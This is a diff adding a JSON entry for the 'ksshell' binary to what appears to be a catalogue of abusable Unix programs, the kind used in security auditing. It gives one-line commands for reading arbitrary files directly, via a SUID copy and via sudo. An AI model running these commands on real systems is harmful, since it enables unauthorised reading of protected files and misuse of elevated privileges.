@@ -1,0 +1,20 @@
+{
+  "description": "Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.\n",
+  "functions": {
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\nksshell -i $LFILE\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "LFILE=file_to_read\n./ksshell -i $LFILE\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
+      }
+    ]
+  }
+}
